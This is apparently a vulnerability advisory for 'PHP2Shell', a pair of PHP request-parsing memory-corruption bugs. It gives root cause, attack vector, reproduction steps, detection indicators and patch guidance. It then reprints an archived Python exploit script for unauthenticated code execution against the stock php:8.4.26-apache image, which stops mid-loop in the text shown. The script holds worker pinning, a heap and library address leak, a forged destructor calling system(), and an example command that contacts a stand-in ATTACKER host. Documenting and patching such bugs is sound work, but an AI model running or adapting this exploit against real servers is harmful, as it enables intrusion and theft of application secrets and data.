Summary

PHP2Shell is a pair of PHP-core memory-corruption bugs that turn request parsing into unauthenticated remote code execution. When a request exhausts the PHP memory limit during multipart/upload parsing, PHP’s longjmp-based OOM bailout can leave request memory uninitialized (CVE-2026-109618), and a related bug can leave global state pointing into freed request memory across requests on the same worker (CVE-2026-109619). The public PoC reaches RCE against the stock php:8.4.26-apache image with a 128M memory limit and display errors off, using only HTTP: it pins an Apache worker, leaks the heap and libphp bases through an oversized Set-Cookie OOB read, then forges a hash-table destructor that calls the zif system function.

Vulnerability Details

Root Cause

PHP allocates request memory from the Zend memory manager and frees it at request shutdown. On an out-of-memory condition during request parsing, PHP uses longjmp() to abort the current context. Some parsing contexts do not account for this bailout and leave parts of request memory uninitialized before the next allocation; the cleanup path can then read or branch on that memory. A second bug leaves global state temporarily pointing into request memory and can preserve those stale pointers after the memory is freed, so a later request handled by the same worker can observe stale state. Both bugs are in the request-parsing / shutdown path, before any application script runs.

Attack Vector

An unauthenticated attacker sends crafted HTTP requests to any PHP endpoint — the PoC target page is only <?php echo "OK\n"; ?>. The chain uses chunked multipart bodies (no Content-Length) to bypass the post_max_size check, thousands of nested file fields and a PHP_SESSION_UPLOAD_PROGRESS part to force an OOM inside php_url_encode() during END cleanup, and a large Set-Cookie to read out of bounds and leak the chunk and libphp bases. A second OOM points the session state at a forged structure; a final request writes a fake zend_array whose pDestructor is zif_system, which is invoked during zend_hash_destroy().

Impact

Remote code execution as the PHP worker user (www-data in the reference lab). The PoC demonstrates command execution with id and supports arbitrary commands; a compromised web tier gives access to application secrets, databases, and any files readable by the web user.

Proof of Concept

Step-by-Step Reproduction

  1. Start the stock target — ./pure/run_pure.sh starts php:8.4.26-apache with the official ini and prefork configuration; the target page is a one-line <?php echo "OK\n"; ?>.
  2. Pin one worker — with MaxRequestWorkers=150, the exploit holds 149 children with incomplete POST bodies so the four chain requests are served by the same child.
  3. A1 / B1 — trigger the END-cleanup OOM, then leak the chunk base and libphp base through the oversized Set-Cookie OOB read (zval_ptr_dtor pointers in the leak window).
  4. A2 / B2 — trigger the cheap OOM, write the fake reference and fake zend_array, and let zend_hash_destroy() call system() during request shutdown.
  5. Verify — the proof file contains uid=33(www-data) gid=33(www-data) groups=33(www-data).

Detection & Indicators of Compromise

  • PHP / Apache logs showing Allowed memory size of ... exhausted during multipart parsing, followed by worker restarts or 500/502 responses.
  • Repeated chunked multipart requests larger than post_max_size, with very large header counts, nested file fields, or PHP_SESSION_UPLOAD_PROGRESS activity.
  • Set-Cookie responses with unusually large encoded values, or anomalous PHPSESSID growth.
  • Worker crashes / segmentation faults in the PHP process, especially clustered with OOM entries.
  • The upstream response kit (orbitron-ai/php2shell-response-kit) provides Sigma, Splunk, QRadar, CrowdStrike, SentinelOne, Wazuh, YARA and ModSecurity content; treat it as detection guidance, not part of this PoC.

Remediation

ActionDetail
PatchUpgrade to PHP 8.2.35, 8.3.36, 8.4.27 or 8.5.12 (or later) and restart every PHP worker; opcache/APCu alone does not replace the restart.
WorkaroundThe upstream advisory’s mitigations reduce risk but do not fully fix: set memory_limit = -1 with a cgroup/container memory limit, post_max_size = 8M (32M with uploads), session.upload_progress.enabled = 0, and fatal_error_backtraces = 0 on PHP 8.5.
Config HardeningPut a WAF/reverse proxy in front of PHP, cap request body size and header counts, isolate web workers, and monitor for OOM-driven worker restarts.

#!/usr/bin/env python3
# Archived for authorized security research only.
# Source: https://github.com/9bie/php2shell-bypass-aslr-exp (no explicit upstream license)
"""One-shot pure-HTTP exploit for official php:8.4.26-apache, 128M,
display_errors=Off (no gdb, no target-side files).

  A1  : END-cleanup send_cookie OOM            (mk_a1.py, chunked)
  B1  : stale-id OOB read -> chunk base + libphp base (mk_leak_b.py, chunked)
  A2  : cheap-OOM -> dangling PS(http_session_vars)
  B2  : fake reference + fake zend_array -> pDestructor = zif_system

The proof command (default `id>/out/p1`) runs inside the target.  For a
remote target use an out-of-band command, e.g.
  --cmd 'php -r "file_get_contents(\\"http://ATTACKER/ok\\");"'

usage:
  python3 exploit.py --port 18110 --restart p2s-pure-18110

`pure/pwn_pure.py` is kept as a compatibility alias for this entry point.

For the stock official prefork config (MaxRequestWorkers=150), the exploit
holds `--workers - 1` partial requests open so the four chain requests are
served by the same child.  Use `--workers 1` for the old single-worker lab.
"""
from __future__ import annotations

import argparse
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
R = HERE
PURE = os.path.join(HERE, "pure")
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
# pointers-to-main-chunk fingerprint in the LEAK_SPEC window (stable count)
MAIN_BUCKET_COUNT = 87
PROFILES = {
    "x86_64": {
        "dtor_offset": 0x65EB60,
        "zif_offset": 0x465370,
        "ptr_max": 0x7FFFFFFFFFFF,
        "delta_min": 0x1A00000,
        "delta_max": 0x1F00000,
    },
    "aarch64": {
        "dtor_offset": 0x63812B,
        "zif_offset": 0x42CD70,
        "ptr_max": 0xFFFFFFFFFFFF,
        "delta_min": 0x1F00000,
        "delta_max": 0x2300000,
    },
}


def send_chunked(port: int, path: str, body_file: str, timeout: float,
                 save: str = "") -> bytes:
    cmd = [sys.executable, os.path.join(PURE, "chunked_send.py"),
           "--port", str(port), "--body-file", body_file,
           "--path", path, "--timeout", str(timeout)]
    if save:
        cmd += ["--save-response", save]
    subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL)
    return open(save, "rb").read() if save else b""


def send_plain(port: int, path: str, body: bytes, timeout: float = 120.0) -> bytes:
    req = ("POST %s HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n" %
           (path, port, "C" * 10, len(body))).encode()
    out = bytearray()
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(req + body)
        while len(out) < 4 << 20:
            chunk = s.recv(65536)
            if not chunk:
                break
            out.extend(chunk)
    except OSError:
        pass
    s.close()
    return bytes(out)


def parse_leak(resp: bytes, profile=None):
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = Counter()
    ptr_max = profile["ptr_max"] if profile is not None else 0xFFFFFFFFFFFF
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= ptr_max:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")
    zdtor, n = counts.most_common(1)[0]
    if profile is None:
        arch = "aarch64" if zdtor > 0x7FFFFFFFFFFF else "x86_64"
        profile = PROFILES[arch]
    else:
        arch = next((name for name, prof in PROFILES.items() if prof is profile),
                    "unknown")
    if profile["ptr_max"] != 0xFFFFFFFFFFFF:
        counts = Counter({q: c for q, c in counts.items()
                          if q <= profile["ptr_max"]})
    lib = zdtor - profile["dtor_offset"]
    buckets = Counter()
    bucket_first = {}
    for q, c in counts.items():
        b = q & ~0x1FFFFF
        buckets[b] += c
        bucket_first.setdefault(b, q)
    # drop the libphp bucket and the dominant id-chunk bucket
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    # prefer the bucket whose pointer count matches the stable fingerprint
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return {
        "decoded": len(dec),
        "arch": arch,
        "profile": profile,
        "zdtor": zdtor,
        "lib": lib,
        "buckets": buckets,
        "main_candidates": [b for b, c in cands[:3]],
        "cand_counts": {b: c for b, c in cands[:3]},
    }


def hold_workers(port: int, workers: int):
    """Occupy all but one prefork child with incomplete POST bodies.

    The official image ships MaxRequestWorkers=150.  Holding 149 children
    makes every later request land on the same remaining child, which is
    what the cross-request dangling pointers require.
    """
    holders = []
    if workers <= 1:
        return holders
    n = workers - 1
    for i in range(n):
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=5)
            s.sendall(b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
                      b"Content-Type: application/x-www-form-urlencoded\r\n"
                      b"Content-Length: 1048576\r\n\r\nx")
            holders.append(s)
        except OSError as exc:
            print("      holder %d/%d failed: %r" % (i + 1, n, exc))
            break
        time.sleep(0.01)
    time.sleep(0.8)
    print("      pinned %d/%d workers (%d holders)" % (
        len(holders) + 1, workers, len(holders)))
    return holders


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=18110)
    ap.add_argument("--arch", choices=("auto",) + tuple(PROFILES),
                    default="auto",
                    help="target architecture (default: auto from the leak)")
    ap.add_argument("--restart", default="",
                    help="docker container name to restart before the chain")
    ap.add_argument("--docker", default="sudo docker")
    ap.add_argument("--cmd", default="id>/out/p1")
    ap.add_argument("--proof", default=os.path.join(R, "out", "p1"))
    ap.add_argument("--outdir", default=os.path.join(R, "out"))
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--workers", type=int, default=150,
                    help="prefork MaxRequestWorkers (1 = no pinning)")
    args = ap.parse_args()
    profile = None if args.arch == "auto" else PROFILES[args.arch]

    os.makedirs(args.outdir, exist_ok=True)
    if os.path.exists(args.proof):
        try:
            os.remove(args.proof)
        except PermissionError:
            subprocess.run(["sudo", "rm", "-f", args.proof], check=False)

    if args.restart:
        subprocess.run(args.docker.split() + ["restart", args.restart],
                       check=True, stdout=subprocess.DEVNULL)
        time.sleep(1.2)

    holders = hold_workers(args.port, args.workers)
    try:
        return run_chain(args, holders, profile)
    finally:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass


def run_chain(args, holders, profile) -> int:
    for attempt in range(1, args.retries + 1):
        tmp = tempfile.mkdtemp(prefix="p2s-pure-")
        try:
            s = socket.create_connection(("127.0.0.1", args.port), timeout=5)
            s.sendall(b"GET /index.php HTTP/1.0\r\nHost: x\r\n\r\n")
            s.recv(1024)
            s.close()
        except OSError:
            pass

        print("[try %d] A1: END-cleanup send_cookie OOM" % attempt)
        a1 = os.path.join(tmp, "a.bin")
        subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                        "--out", a1, "--big", "78"], check=True,
                       stdout=subprocess.DEVNULL)
        send_chunked(args.port, "/index.php" + Q, a1, 180)
        time.sleep(0.2)

        print("[try %d] B1: stale-id OOB read (chunk base + libphp)" % attempt)
        b1 = os.path.join(tmp, "b1.bin")
        subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
                        "--out", b1, "--spec", LEAK_SPEC,
                        "--fake-len", "0xC8000", "--tag"], check=True,
                       stdout=subprocess.DEVNULL)
        leak_file = os.path.join(tmp, "leak.resp")
        try:
            resp = send_chunked(args.port, "/index.php", b1, args.timeout, leak_file)
            info = parse_leak(resp, profile)
        except Exception as exc:
            print("      leak failed: %r" % (exc,))
            continue
        print("      arch=%s decoded=%d zval_ptr_dtor=%#x -> libphp=%#x" % (
            info["arch"], info["decoded"], info["zdtor"], info["lib"]))
        print("      chunk buckets: %s" % [(hex(b), c) for b, c in
                                           info["buckets"].most_common(6)])
        if not info["main_candidates"]:
            print("      no main-chunk candidate")
            continue
        main = info["main_candidates"][0]
        delta = info["lib"] - main
        prof = info["profile"]
        if not (prof["delta_min"] <= delta <= prof["delta_max"]):
            print("      implausible libphp-main delta %#x; re-leak" % delta)
            continue

        zif = info["lib"] + prof["zif_offset"]
        for cand in info["main_candidates"]:
            S = cand + 0xF8398
            print("[try %d] A2 + B2: main=%#x S=%#x zif_system=%#x" % (
                attempt, cand, S, zif))
